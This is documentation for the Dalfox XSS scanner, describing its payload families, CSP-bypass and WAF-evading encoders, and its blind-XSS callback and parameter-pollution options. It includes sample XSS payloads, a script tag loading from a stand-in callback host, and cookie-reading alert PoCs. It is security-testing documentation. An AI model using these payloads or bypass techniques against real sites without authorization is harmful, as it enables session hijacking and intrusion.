+++
title = "Payloads & Encoding"
description = "Built-in payload families, encoders, custom payloads, and remote wordlists."
weight = 3
toc = true
+++

Dalfox ships with a curated, context-aware payload library. Most of the time you don't need to think about it. The engine picks the right payloads for each injection context. This page covers what's built in and how to extend it.

## Payload families

Dalfox composes payloads from several families:

| Family | Example | Used when |
|--------|---------|-----------|
| **HTML tag** | `<svg onload=alert(1)>` | HTML context |
| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | Inside an attribute |
| **JavaScript** | `";alert(1);//` | Inside a `<script>` block |
| **Event handler** | `onmouseover=alert(1)` | Existing attribute value |
| **DOM clobbering** | `<img id=x>` | Legacy DOM lookups |
| **URL protocol** | `javascript:alert(1)` | `href`/`src`-like attributes |
| **CSP bypass** | `strict-dynamic` script gadgets, nonce reuse, JSONP on allowed hosts | When the response carries a bypassable CSP |
| **mXSS** | `<foreignobject>`/DOMPurify bypasses | Sanitizer-mutated DOM |
| **Blind** | `<script src=//callback/></script>` | `--blind` is set |

Each payload template carries a marker (`class={CLASS}` or `id={ID}`) so the verification stage can positively identify its own element in the DOM.

## Context-aware selection

During discovery Dalfox classifies each parameter by **injection context**, the place where its reflected value lands:

- HTML body → HTML/attribute-breakout payloads
- Inside a quoted attribute → attribute-breakout payloads
- Inside `<script>` → JS-breakout payloads
- Inside `<style>` → CSS payloads
- Unknown → fallback mix of HTML + attribute

This keeps request counts sane while maximising hit rate.

## CSP-aware bypass payloads

When the preflight stage sees a `Content-Security-Policy` (or `…-Report-Only`)
header, or a `<meta http-equiv>` equivalent, Dalfox parses it and tailors the
script-execution payloads to that policy's actual weaknesses. Payloads are only
generated for the directives that are genuinely exploitable, so a target with no
CSP (or a hardened one) sees no extra requests.

| CSP shape | What Dalfox emits |
|-----------|-------------------|
| `unsafe-inline` / `unsafe-eval` | direct inline / `eval`-family payloads |
| missing `base-uri` / `object-src` | `<base>` hijack / `<object>`/`<embed>` injection |
| `data:` / `blob:` in `script-src` | `<script src=data:…>` / `Blob` URL loaders |
| whitelisted CDN host | the matching JSONP / framework **script gadget** for that host |
| `strict-dynamic` | DOM script-gadgets (RequireJS `data-main`, `document.write` self-propagation, AngularJS bootstrap) plus **nonce reuse** when a nonce is captured |

Two modern shapes that earlier releases parsed but never acted on are now live:

- **`strict-dynamic`.** Under `strict-dynamic` the browser ignores the host
  allowlist, so a plain `<script src=allowed-host>` no longer loads. Dalfox
  switches to DOM script-gadgets (payloads that get an already-trusted script
  to create the attacker script) and, when the policy pins a nonce, emits a
  `<script nonce=…>` reuse payload (effective when the nonce is static,
  predictable, or reflected).
- **Nonce / hash pinning.** `'nonce-…'` and `'sha256-…'` tokens are parsed and
  used to classify the policy. A pure random-nonce/hash policy with no
  `strict-dynamic` and no gadget host is treated as *hardened* — Dalfox does not
  waste requests on it.

The gadget set lives in an embedded, extensible database (JSONBee / H5SC /
Google CSP-Evaluator shapes) rather than a hardcoded list, so coverage grows
without touching the analyzer.

## Trusted Types awareness

[Trusted Types](https://web.dev/articles/trusted-types) is the primary DOM-XSS
mitigation in hardened apps. Dalfox's AST DOM-XSS analyzer understands it:

- A **strict** policy callback (`createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})`)
  clears taint just like any other sanitizer, so values routed through
  `p.createHTML(x)` no longer report.
- A **permissive** default policy (the classic bypassable no-op
  `createPolicy('default', {createHTML: x => x})`) is *not* mistaken for
  protection; the finding is kept and flagged.
- When the response CSP enforces `require-trusted-types-for 'script'` **and** the
  page defines a strict `'default'` policy, the browser auto-sanitizes every
  TrustedHTML sink — Dalfox suppresses those now-false-positive findings.

The classifier is deliberately conservative: anything it can't prove safe stays
permissive, so the finding is kept. Suppression never fires without enforcement,
so a page that defines a default policy but forgets `require-trusted-types-for`
still reports — no false negatives are introduced.

## Encoders

Encoders transform the *same payload* into multiple forms so the WAF and server-side filters don't all see the same bytes.

```bash
dalfox https://target.app -e url,html,base64
```

Available encoders:

| Encoder | Transforms `<` to |
|---------|-------------------|
| `none` | `<` (raw) |
| `url` | `%3C` |
| `2url` | `%253C` (double) |
| `3url` | `%25253C` (triple) |
| `4url` | quadruple URL |
| `html` | `&#x003c;` |
| `htmlpad` | zero-padded HTML entity |
| `base64` | base64 of payload |
| `unicode` | fullwidth mapping |
| `zwsp` | zero-width space insertion |

Defaults: `url,html`. If you add `none` to the list, Dalfox sends only the raw payloads.

## Custom payloads

Provide your own list, one payload per line:

```bash
dalfox https://target.app --custom-payload mypayloads.txt
```

Swap out the built-in library entirely:

```bash
dalfox https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

## Remote payload sources

Pull community wordlists on demand:

```bash
dalfox https://target.app --remote-payloads portswigger,payloadbox
```

Supported sources: `portswigger`, `payloadbox`. Fetched once per run, respecting `--proxy` and `--timeout`.

## Inspecting payloads

Print a payload family without running a scan:

| Selector | Description | Example |
|----------|-------------|---------|
| `javascript` | Print the canonical JavaScript execution payloads used in JS-string / script contexts (`alert(1)`, backtick and keyword-split variants, ...) | `dalfox payload javascript` |
| `event-handlers` | List all DOM event handler attribute names (e.g., `onclick`, `onmouseover`) | `dalfox payload event-handlers` |
| `useful-tags` | List useful HTML tag names often used in XSS contexts (e.g., `script`, `img`, `svg`) | `dalfox payload useful-tags` |
| `payloadbox` | Fetch and print remote XSS payloads from PayloadBox | `dalfox payload payloadbox` |
| `portswigger` | Fetch and print remote XSS payloads from PortSwigger | `dalfox payload portswigger` |
| `uri-scheme` | Print scheme-based XSS payloads (`javascript:`, `data:`, etc.) | `dalfox payload uri-scheme` |
| `special-chars` | Print special characters (and encoded variants) for context probing / breakout | `dalfox payload special-chars` |
| `functions` | Print visibly-confirmable sinks with filter-surviving variants (`alert`, `prompt`, ...) | `dalfox payload functions` |
| `awesome-alert` | Print polished alert PoCs for clean screenshots/demos (`alert(document.domain)`, ...) | `dalfox payload awesome-alert` |
| `dom-clobbering` | Print DOM clobbering payloads | `dalfox payload dom-clobbering` |
| `mxss` | Print mutation-XSS / sanitizer-bypass payloads | `dalfox payload mxss` |
| `blind` | Print blind-XSS skeletons (`{}` = your OOB callback URL) | `dalfox payload blind` |
| `all` | Print every local selector above in one pass, each under a `# name` header (remote selectors excluded — no network fetch) | `dalfox payload all` |

```bash
dalfox payload javascript      # alert(1), alert`1`, prompt(1), ...
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:
dalfox payload special-chars   # < > " ' ` ( ) ... and encoded variants
dalfox payload functions       # confirmable sinks: alert(1), window['alert'](1), ...
dalfox payload awesome-alert   # PoC alerts: alert(document.domain), alert(document.cookie)
dalfox payload dom-clobbering  # DOM clobbering vectors
dalfox payload mxss            # mutation-XSS / sanitizer-bypass payloads
dalfox payload blind           # blind-XSS skeletons ({} = your callback URL)
dalfox payload portswigger     # fetch + print remote list
dalfox payload all             # every local selector, grouped under "# name" headers
```

Every selector prints one entry per line, so it composes with the usual shell tools:

```bash
dalfox payload functions | grep -i prompt
dalfox payload special-chars | wc -l
```

The `special-chars` group is handy for manual reflection testing — inject each byte on
its own to see which characters survive verbatim, which come back HTML/URL-encoded, and
which are stripped. `functions` and `awesome-alert` are curated to *visibly* fire (and to
render the host/origin), so a single screenshot proves impact.

## Customising the "alert"

The classic `alert(1)` can be loud. Swap it out so you can prove impact without popping dialogs everywhere:

```bash
dalfox https://target.app \
  --custom-alert-value "document.domain" \
  --custom-alert-type str
```

- `--custom-alert-value`: value passed to `alert`/`prompt`/`confirm` (default `1`).
- `--custom-alert-type`: `none` keeps the original function, `str` wraps the value in quotes.

## Blind XSS

Blind XSS fires later, in a context you can't see (an admin panel, a support agent's dashboard). You need an out-of-band listener:

```bash
dalfox https://target.app -b https://your-callback.interact.sh
```

Custom blind templates:

```bash
dalfox https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# each line may contain {} (replaced with the callback URL)
```

## HTTP Parameter Pollution (HPP)

Some filters only inspect the *first* occurrence of a parameter. Dalfox can duplicate parameters to slip a payload into the second slot:

```bash
dalfox https://target.app --hpp
```

## Deep scan

By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going:

```bash
dalfox https://target.app --deep-scan
```

Useful for research; slower for production pipelines.

## Skipping payload stages

| Flag | Effect |
|------|--------|
| `--skip-xss-scanning` | Discover and probe only; no payload injection |
| `--skip-ast-analysis` | Skip AST-based DOM-XSS detection of inline scripts (the `[A]` findings) |

`--skip-ast-analysis` is the control for the static DOM-XSS pass that reports `source → sink` flows (e.g. `location.hash` → `innerHTML`) as `[A]` (AST-detected) findings — independent of parameter mining. `--skip-mining-dom` does **not** affect it. To keep the pass running but hide those findings from the output, use `--only-poc v,r`. What `[A]` actually proves (and why a pure client-side DOM-XSS never reaches `[V]`) is covered in [Detection Model](../detection-model/).

## Next

- Pair this with [WAF Bypass](../waf-bypass/) to bend payloads around filters.
- See [Output &amp; Reports](../output/) to export findings.
